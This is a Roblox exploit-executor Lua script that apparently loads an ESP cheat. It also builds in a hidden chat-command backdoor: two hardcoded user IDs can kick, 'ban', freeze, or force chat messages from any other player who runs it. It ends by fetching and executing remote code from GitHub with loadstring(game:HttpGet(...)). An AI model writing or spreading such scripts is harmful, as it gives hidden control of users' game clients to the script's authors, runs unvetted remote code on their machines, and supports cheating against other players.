local admins = {
    528650746,
    3106920778,
  }
  
  local admin = false
  
  local plr = game.Players.LocalPlayer
  if table.find(admins, plr.UserId) then
          print"ALLOWED"
          admin = true
  end
  
  for i,v in pairs(game:GetService('Players'):GetChildren()) do
      local isadmin = table.find(admins, v.UserId)
      if isadmin then
          print('found')
          v.Chatted:Connect(function(msg)
             local player = v
             local args = string.split(msg, " ")
             local this = game.Players.LocalPlayer
             
                if admin == true then
                    print('ADMIN COMMANDS BYPASSED')
                end
                
                if admin == false then
                    --cmd1
                    if args[1] == "!ban" then
                    if args[2] == this.Name or args[2] == "." and admin == false then
                        game.Players.LocalPlayer:Kick("PERMA-BANNED")
                        end
                    end
                    --cmd2
                    if args[1] == "!say" or args[1] == "!req" and args[2] == this.Name or args[2] == "."  then
                            local player = game.Players.LocalPlayer
                            
                        local message = {
                            [1] = args[3],
                            [2] = "All"
                        }

                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(message))
                            
                    end
                    --cmd3
                    if args[1] == "!users" or args[1] == "!verify" then
                            if args[2] == "." then
                            local player = game.Players.LocalPlayer
                            
                            local verify = {
                                [1] = "Yeah, yeah",
                                [2] = "All"
                            }

                            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(verify))
                        end
                    end
                    --cmd4
                    if args[1] == "!kick" then
                    if args[2] == this.Name or args[2] == "." and admin == false then
                        game.Players.LocalPlayer:Kick("KICKED BY ADMIN")
                        end
                    end
                    --cmd5
                    if args[1] == "!freeze" then
                    if args[2] == this.Name or args[2] == "." and admin == false then
                            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                        end
                    end
                    --cmd6
                    if args[1] == "!thaw" then
                    if args[2] == this.Name or args[2] == "." and admin == false then
                            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
                        end
                    end
                    --endcmds
                end
          end)
      end
  end
  
  game.Players.PlayerAdded:Connect(function(plr) 
	plr.CharacterAdded:Connect(function(Char)
		Char:WaitForChild("Humanoid")
		if plr.UserId == 528650746 then
			Char.Humanoid.DisplayName = "[ðŸ‘‘]" .. plr.DisplayName
        end
	end)
end)

wait(1)

loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/ownerDHM'),true))()

wait(.5)

loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/ESPUnnamed"))()
